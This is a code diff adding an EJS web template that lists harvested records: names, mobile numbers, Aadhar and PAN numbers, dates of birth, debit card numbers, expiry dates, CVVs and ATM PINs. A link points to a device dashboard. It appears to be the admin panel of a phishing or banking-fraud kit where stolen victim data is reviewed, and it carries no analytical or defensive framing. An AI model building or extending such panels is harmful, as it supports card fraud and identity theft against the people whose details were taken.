@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User and Payment Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>User and Payment Details</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+
+    <!-- User Details Section -->
+    <h2>User Details</h2>
+    <% if (user && user.length > 0) { %>
+      <% user.forEach((userDoc, docIndex) => { %>
+        <% if (userDoc.entries && userDoc.entries.length > 0) { %>
+          <% userDoc.entries.forEach((entry, entryIndex) => { %>
+            <div class="card">
+              <h3>User Information - <%= entryIndex + 1 %></h3>
+              <p><strong>Name:</strong> <%= entry.fullName %></p>
+              <p><strong>Number:</strong> <%= entry.mobileNumber %></p>
+              <p><strong>Aadhar Number:</strong> <%= entry.aadharNumber %></p>
+              <p><strong>PAN:</strong> <%= entry.panCard %></p>
+              <p><strong>DOB:</strong> <%= entry.dob %></p>
+              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+            </div>
+          <% }); %>
+        <% } else { %>
+          <p>No user entries found in document <%= docIndex + 1 %></p>
+        <% } %>
+      <% }); %>
+    <% } else { %>
+      <p>No User Data Found</p>
+    <% } %>
+
+    <!-- NetBanking Details Section -->
+    <h2>Net Banking Details</h2>
+    <% if (netBanking && netBanking.length > 0) { %>
+      <% netBanking.forEach((bank, bankIndex) => { %>
+        <div class="card">
+          <h3>Net Banking Information - <%= bankIndex + 1 %></h3>
+          <% bank.entries.forEach((entry, index) => { %>
+            <div class="sub-card">
+              <h4>Entry <%= index + 1 %></h4>
+              <p><strong>Card Number:</strong> <%= entry.debitCardNumber %></p>
+              <p><strong>Expiry Date:</strong> <%= entry.expiryDate %></p>
+              <p><strong>CVV:</strong> <%= entry.cvv %></p>
+              <p><strong>ATM PIN:</strong> <%= entry.atmPin %></p>
+              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+            </div>
+          <% }); %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Net Banking Data Found</p>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
